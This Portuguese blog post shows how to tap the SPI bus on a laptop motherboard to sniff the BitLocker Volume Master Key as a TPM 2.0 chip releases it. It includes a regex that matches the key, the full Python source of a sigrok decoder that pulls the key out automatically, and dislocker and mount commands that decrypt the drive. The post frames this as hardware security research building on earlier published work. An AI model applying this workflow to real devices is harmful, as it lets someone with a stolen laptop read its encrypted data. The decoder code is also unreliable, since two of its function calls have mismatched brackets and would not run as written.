---
title: 'TPM 2.0: Extrair chaves do Bitlocker por SPI'
date: 2024-01-16T20:48:00-03:00
author: Lucas Teske
layout: post
image: /assets/gepeto/tpm2.0.jpg
categories:
  - Reverse Engineering
  - Satellite
  - SDR
tags:
  - Flash
  - PAX
  - Hardware Hacking
  - RE
  - Reverse Engineering
  - NAND
  - PAX
  - RT809H

---

O TPM 2.0, também conhecido como Trusted Platform Module 2.0, é um recurso de segurança de hardware que está incorporado em muitos computadores modernos. Sua finalidade é proporcionar uma maneira segura de armazenar chaves criptográficas e outros dados sensíveis, tais como senhas e certificados digitais, visando proteger contra diversas ameaças de segurança, incluindo acesso não autorizado ao hardware e software de um computador. O TPM 2.0 representa uma evolução da especificação original do TPM, desenvolvida pelo Trusted Computing Group (TCG), e apresenta recursos e capacidades adicionais, como suporte a algoritmos criptográficos adicionais e a capacidade de armazenar quantidades maiores de dados.

### Coisas boas

Atualmente, o Trusted Platform Module (TPM) é amplamente utilizado por mecanismos de criptografia de disco completo (Full Disk Encryption - FDE) e também por criptografia específica do dispositivo, já que geralmente está vinculado ao dispositivo (soldado na placa-mãe).

É notável que, além de ser um recurso de segurança avançado em máquinas modernas, o protocolo de comunicação utilizado pelos Integrated Circuits (ICs) TPM é bastante simples. Geralmente, os ICs TPM utilizam o protocolo de comunicação Serial Peripheral Interface (SPI), mas também podem utilizar o protocolo Low Pin Count (LPC) e o protocolo Inter-Integrated Circuit (I2C). Uma questão importante a ser levantada é que os usuários geralmente confiam no TPM como uma medida de segurança confiável, no entanto, o tráfego no barramento geralmente é transmitido em texto simples. Por exemplo, após o desbloqueio do TPM, a chave do Bitlocker do Windows é transmitida em texto simples no barramento.

Para este artigo, as suposições e análises são baseadas na especificação 2.0, versão 1.03v22 do TPM (na data do artigo atual, a especificação mais utilizada em computadores domésticos e servidores), que está disponível aqui: [https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf](https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf)

Além disso, é importante mencionar que este artigo se baseia em outros dois artigos, que podem ser encontrados nos seguintes links:

[https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key](https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key)

[https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network](https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network)

Cabe ressaltar que até o presente momento, o conhecimento aplicado com sucesso permitiu a extração de uma chave do Bitlocker em um cenário real.

### Transação SPI do TPM

Uma transação do Trusted Platform Module (TPM) por meio do protocolo Serial Peripheral Interface (SPI) é uma série de operações executadas por um dispositivo TPM. Essas operações incluem, normalmente, a inicialização do TPM, a criação e gerenciamento de chaves criptográficas e a execução de operações criptográficas, como criptografia e assinatura.

Um exemplo comum de uso do TPM é proteger as chaves de criptografia de um sistema, permitindo que o sistema seja iniciado somente se o TPM permitir após uma série de verificações de segurança. Outro exemplo é criar uma conexão segura com outro dispositivo, criando um par de chaves exclusivo, armazenando a chave privada no TPM e compartilhando a chave pública com o outro dispositivo.

As transações do dispositivo TPM são normalmente executadas interagindo com um driver de dispositivo TPM, que é um software que se comunica com o dispositivo TPM e gerencia suas operações. As transações do dispositivo TPM são normalmente governadas pela Application Programming Interface (API) da biblioteca TPM2.0.

Existem vários tipos de transações que podem ser analisados por meio do SPI, porém, para o propósito de recuperar as chaves do Bitlocker, apenas dois são relevantes: FIFO Write e FIFO Read. O foco nessas duas operações é necessário para acessar a chave Volume Master Key (VMK), que é responsável por criptografar a chave AES256-XTS.

A VMK é criptografada pelo TPM e armazenada no cabeçalho Bitlocker do disco de destino. Durante o processo de inicialização, o carregador de inicialização do Windows recupera a VMK criptografada do cabeçalho Bitlocker e envia-a para o TPM como uma solicitação de descriptografia. O TPM, então, envia de volta a versão descriptografada da VMK, assumindo que o TPM está configurado corretamente e todas as verificações de segurança foram aprovadas. O resultado do processo de descriptografia depende da configuração do TPM.

Em sistemas com inicialização segura completa, o TPM exige que múltiplos hashes sejam corretamente inicializados durante as primeiras etapas do processo de inicialização. Os detalhes específicos desse processo estão fora do escopo desta explicação, mas é importante observar que cada etapa do processo de inicialização do sistema faz um hash da próxima etapa e carrega-o no TPM. Por exemplo, a primeira etapa é um bootrom dentro da CPU que verifica a assinatura da primeira etapa do BIOS.

### Interceptando o TPM

O chip Trusted Platform Module (TPM) geralmente está localizado na placa-mãe de uma forma que não é facilmente acessível, por exemplo, no lado do teclado de um laptop. No entanto, como o protocolo Serial Peripheral Interface (SPI) é um protocolo de barramento, é possível inferir que todos os dispositivos SPI na placa-mãe utilizem as mesmas linhas de clock e dados. Como resultado, é possível conectar um analisador lógico à memória flash SPI que armazena o código BIOS/UEFI e monitorar quaisquer transações SPI que ocorram quando a memória flash estiver inativa (quando o sinal de seleção do chip para a memória flash estiver baixo). Essa abordagem permite detectar as transações relevantes para recuperar as chaves do Bitlocker.
![](/assets/posts/patreon/Pasted image 20230124034954.png)
![](/assets/posts/patreon/Pasted image 20230124035004.png)

Este método, no entanto, pode levar a complicações potenciais se houver outros dispositivos conectados ao mesmo barramento SPI, além da memória flash SPI e do TPM. Embora seja relativamente improvável que vários dispositivos estejam conectados ao mesmo barramento nesse contexto.

No pulseview, podemos analisar os bytes SPI usando a função decodificadora de SPI.
![](/assets/posts/patreon/Pasted image 20230124035010.png)
![](/assets/posts/patreon/Pasted image 20230124035020.png)

Em seguida, precisamos configurar o decodificador SPI para os sinais corretos para poder ver os bytes decodificados.
![](/assets/posts/patreon/Pasted image 20230124035029.png)

Então, você notará que, como deixamos o campo de polaridade do CS# como "**active-low**", ele está decodificando apenas as transações do BIOS Flash, não o "resto" do barramento.
![](/assets/posts/patreon/Pasted image 20230124035036.png)

Se selecionarmos "**active-high**", analisaremos qualquer coisa que **não** seja o BIOS flash (que é o que queremos):
![](/assets/posts/patreon/Pasted image 20230124035040.png)

Agora temos bytes analisados para o SPI, o que torna mais fácil para nós trabalharmos com eles. Agora precisamos criar um plugin do sigrok para analisá-lo.

### Analisando o TPM no Sigrok / Pulseview

A criação de um plugin Sigrok é um processo simples, graças ao guia oficial detalhado disponível no site do Sigrok em [https://sigrok.org/wiki/Protocol_decoder_HOWTO](https://sigrok.org/wiki/Protocol_decoder_HOWTO). Dado que estamos trabalhando com o protocolo Serial Peripheral Interface (SPI), é adequado utilizar a funcionalidade "Decodificador de Pilha" do Sigrok, que permite encadear vários decodificadores e usar a saída de um decodificador como entrada de outro. Essa abordagem simplifica o processo, eliminando a necessidade de localizar e extrair manualmente bits individuais de dados dos dados brutos do SPI e permite que o foco seja nos bytes formados reais produzidos pelo decodificador SPI do Sigrok.

Para começar, é necessário criar uma pasta "tpmdecoder" na pasta de plugins (no Linux, ela está localizada em ~/.local/share/libsigrokdecode/decoders/), com os seguintes arquivos anexados a esta postagem:

-   **init**.py
-   pd.py

Esses são os arquivos necessários para o decodificador que foi desenvolvido. Basicamente, foi criado um decodificador para os registradores TPM, conforme descrito em [https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf](https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf)

Após criar e salvar o projeto do PulseView, é necessário fechar e abrir novamente. O plugin deve ser carregado automaticamente. Na configuração do plugin SPI, na opção "Decodificador de Pilha", a opção "TPM2.0" deverá estar disponível.
![](/assets/posts/patreon/Pasted image 20230124035119.png)
E depois de selecionar, ele começará a tentar encontrar mensagens TPM2.0 sobre os dados SPI. ![](/assets/posts/patreon/Pasted image 20230124035129.png)

### Chave do Bitlocker

Para esta seção, é altamente recomendável verificar a documentação do [libbde](https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc) no GitHub. A documentação contém praticamente todas (se não todas) as informações relacionadas ao Bitlocker, incluindo as versões legadas.

A chave que desejamos recuperar é, na verdade, a chave mestra de volume do Bitlocker, que possui um formato específico. Podemos usar uma expressão regular para recuperar essa chave em vez de tentar entender cada solicitação, o que levaria mais tempo para criar um decodificador.

Os dados que são realmente criptografados pelo TPM são uma entrada de metadados FVE, como descrito na seção [5.3 do libbde](https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc#53-fve-metadata-entry). Isso apresenta alguns cabeçalhos que podem ser combinados com uma expressão regular.

```
2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})
```

Depois de todo o cabeçalho, a chave Volume Master Key (VMK) é concatenada. Para encontrar a chave, basta procurar por 64 caracteres (32 bytes, o que corresponde a uma chave de 256 bits).

Para facilitar o uso, o decodificador anexado imprime as chaves encontradas no terminal de decodificação (para que não seja necessário usar a interface do PulseView, se não desejado) e também mostra em uma linha separada no PulseView.
![](/assets/posts/patreon/Pasted image 20230124035206.png)

### Acessando dados usando o VMK descarregado

Para acessar os dados criptografados pelo Bitlocker, utilizaremos o projeto dislocker ([https://github.com/Aorimn/dislocker](https://github.com/Aorimn/dislocker)) para montar a partição como texto simples. Antes disso, é necessário salvar a chave inteira como um arquivo:

```bash
echo "66D96600C7..." | xxd -p -r > vmk.key
```

Em seguida, podemos utilizar o dislocker para criar um nó de dispositivo com o dispositivo em texto simples, usando a partição n em sdx:

```bash
 mkdir -p mydisk && sudo dislocker-fuse -K vmk.key /dev/sdxn -- ./mydisk
```

Por exemplo, se a partição criptografada estiver em /dev/sda3, pode-se utilizar:

```bash
mkdir -p mydisk && sudo dislocker-fuse -K vmk.key /dev/sda3 -- ./mydisk
```

Será criado um arquivo dislocker dentro da pasta ./mydisk, que representa o dispositivo e pode ser montado como uma partição normal.

```bash
sudo mount -o remove_hiberfile ./mydisk/dislocker-file /media/disk
```

Agora, é possível acessar os dados descriptografados na pasta /media/disk.

### Todas referências consolidadas

Aqui estão todas as referências consolidadas para que possam checar elas.

-   TPM 2.0 Specification - [https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf](https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf)

-   F-Secure - Sniff, there leaks - [https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key](https://labs.withsecure.com/publications/sniff-there-leaks-my-bitlocker-key)

-   DolosGroup - From Stolen Laptop to Inside the company network - [https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network](https://dolosgroup.io/blog/2021/7/9/from-stolen-laptop-to-inside-the-company-network)

# Arquivos

### `__init__.py`

```python
##
## This file is part of the libsigrokdecode project.
##
## Copyright (C) 2022 Lucas Teske <lucas@teske.com.br>
##
## This program is free software; you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation; either version 2 of the License, or
## (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program; if not, see <http://www.gnu.org/licenses/>.
##

from .pd import Decoder
```

### `pd.py`

```python
##
## This file is part of the libsigrokdecode project.
##
## Copyright (C) 2022 Lucas Teske <lucas@teske.com.br>
##
## This program is free software; you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation; either version 2 of the License, or
## (at your option) any later version.
##
## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.
##
## You should have received a copy of the GNU General Public License
## along with this program; if not, see <http://www.gnu.org/licenses/>.
##

import sigrokdecode as srd
import binascii, re
from enum import Enum

OPERATION_MASK = 0x80
SIZE_MASK = 0x3f
WAIT_MASK = 0x01

# Registers at https://trustedcomputinggroup.org/wp-content/uploads/TCG_PC_Client_Platform_TPM_Profile_PTP_2.0_r1.03_v22.pdf
# Page 63 (pdf 71) - Table 17

tpmRegisters = {
    0xD40000: "TPM_ACCESS_0",
    0xD4000C: "TPM_INT_VECTOR_0",
}

for i in range(4):
    tpmRegisters[0xD40008+i] = "TPM_INT_ENABLE_0"

for i in range(4):
    tpmRegisters[0xD40010+i] = "TPM_INT_STATUS_0"

for i in range(4):
    tpmRegisters[0xD40014+i] = "TPM_INTF_CAPABILITY_0"

for i in range(4):
    tpmRegisters[0xD40018+i] = "TPM_STS_0"

for i in range(4):
    tpmRegisters[0xD40024+i] = "TPM_DATA_FIFO_0"

for i in range(4):
    tpmRegisters[0xD40030+i] = "TPM_INTERFACE_ID_0"

for i in range(4):
    tpmRegisters[0xD40080+i] = "TPM_XDATA_FIFO_0"

for i in range(4):
    tpmRegisters[0xD40F00+i] = "TPM_DID_VID_0"

for i in tpmRegisters:
    print("{:08X} = {}".format(i, tpmRegisters[i]))

class State(Enum):
    READING_OP = 1
    READING_ARG = 2
    WAITING = 3
    TRANSFER = 4

class Decoder(srd.Decoder):
    api_version = 3
    id = 'tpm20'
    name = 'TPM2.0'
    longname = 'TPM 2.0'
    desc = 'A TPM 2.0 Protocol Decoder'
    license = 'gplv2+'
    inputs = ['spi']
    outputs = []
    tags = ['SPI', 'TPM']
    options = ()
    annotations = (
        ('text', 'Text'),                   # 0
        ('warning', 'Warning'),             # 1
        ('data-write', 'Data write'),       # 2
        ('data-read', 'Data read'),         # 3
        ('fifo-write', 'FIFO write'),       # 4
        ('fifo-read', 'FIFO read'),         # 5
        ('bitlocker-key', 'Bitlocker Key'), # 6
    )
    annotation_rows = (
         ('row-read', 'Read', (3, )),
         ('row-write', 'Write', (2, )),
         ('row-fifo-read', 'FIFO Read', (5, )),
         ('row-fifo-write', 'FIFO Write', (4, )),
         ('row-bitlocker-key', 'Bitlocker Key', (6, )),
    )
    binary = (
        ('packet-read', 'Packet read'),
        ('packet-write', 'Packet write'),
    )
    options = ()

    def __init__(self):
        self.reset()

    def reset(self):
        self.state = State.READING_OP

    def start(self):
        self.out_ann = self.register(srd.OUTPUT_ANN)
        self.out_python = self.register(srd.OUTPUT_PYTHON)
        self.out_binary = self.register(srd.OUTPUT_BINARY)

    def decode(self, ss, es, data):
        if len(data) == 3 and data[0] == "DATA":
            _, mosi, miso = data
            self.putdata(ss, es, mosi, miso)

    def report_transaction(self, start, end, ttype, addr, data):
        data = binascii.hexlify(bytearray(data)).decode("ascii")
        if addr in tpmRegisters:
            data = "{}: {}".format(tpmRegisters[addr], data)
        else:
            data = "RESERVED({:06X}): {}".format(addr, data)
        self.put(start, end, self.out_ann, [3 if ttype == 1 else 2, [data] ])

    def report_fifo(self, start, end, ttype, data):
        data = " ".join(["{:02X}".format(x) for x in data])
        self.put(start, end, self.out_ann, [5 if ttype == 1 else 4, [data))

    def report_bitlocker_key(self, start, end, key):
        self.put(start, end, self.out_ann, [6, [key))

    opIsRead = 0
    addr = 0
    numBytes = 0
    addrIdx = 0
    bytesRead = []
    transactionStart = 0
    transactionEnd = 0

    def putdata(self, ss, es, mosi, miso):
        if self.state == State.READING_OP:
            self.addr = 0
            self.opIsRead = (mosi & OPERATION_MASK) >> 7    # 1 = read, 0 = write
            self.numBytes = (mosi & SIZE_MASK) + 1          # Minimum transfer = 1 byte
            self.addrIdx = 0
            self.bytesRead = []
            self.state = State.READING_ARG
            self.transactionStart = ss
        elif self.state == State.READING_ARG:
            self.addr = (self.addr << 8) | mosi
            self.addrIdx = self.addrIdx + 1
            if self.addrIdx == 3:
                if miso & WAIT_MASK == 0: # Wait state
                    self.state = State.WAITING
                else:
                    self.state = State.TRANSFER
        elif self.state == State.WAITING:
            if miso & WAIT_MASK == 1: # Wait finished
                self.state = State.TRANSFER
        elif self.state == State.TRANSFER:
            if self.opIsRead == 1: # Read from device
                self.bytesRead.append(miso)
            else:   # Read from controller
                self.bytesRead.append(mosi)
            if len(self.bytesRead) == self.numBytes:
                self.transactionEnd = es
                #print("Transaction: ", self.bytesRead)
                self.report_transaction(self.transactionStart, self.transactionEnd, self.opIsRead, self.addr, self.bytesRead)
                if self.addr in tpmRegisters and tpmRegisters[self.addr] == "TPM_DATA_FIFO_0":
                    self.putfifo(self.transactionStart, self.transactionEnd, self.opIsRead, self.bytesRead)
                elif self.opIsRead == 0:
                    self.endfifo()

                self.state = State.READING_OP

    fifoType = -1 # 0 = Write, 1 = Read
    fifoData = []
    fifoStart = 0
    fifoEnd = 0

    def endfifo(self):
        if self.fifoType == -1:
            return # No FIFO
        self.report_fifo(self.fifoStart, self.fifoEnd, self.fifoType, self.fifoData)

        data = "".join(["{:02X}".format(x) for x in self.fifoData])
        key = re.findall(r'2C000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})', data)
        if key:
            print("Bitlocker Key: {}".format(key[0]))
            self.report_bitlocker_key(self.fifoStart, self.fifoEnd, key[0])
        self.fifoData = []
        self.fifoType = -1

    def putfifo(self, start, end, ttype, data):
        if self.fifoType != ttype:
            self.endfifo()
            self.fifoType = ttype
            self.fifoStart = start
        self.fifoEnd = end
        for i in data:
            self.fifoData.append(i)
```
